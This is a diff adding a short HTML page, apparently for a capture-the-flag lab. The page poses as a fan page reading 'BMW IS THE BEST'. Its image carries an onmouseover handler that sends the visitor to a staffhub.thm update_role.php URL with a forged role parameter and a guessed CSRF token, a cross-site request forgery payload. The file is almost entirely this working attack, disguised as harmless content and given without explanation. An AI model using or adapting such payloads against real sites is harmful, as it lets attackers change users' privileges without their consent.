@@ -1,0 +1,9 @@
+<!Doctype html>
+<html>
+	<body>
+		<h1>BMW IS THE BEST</h1> 
+<img src="bmw.png"
+onmouseover="window.location='http://staffhub.thm:8080/update_role.php?role=staff&csrf_token=YWRtaW4=';">
+		</body>
+	</html>
+
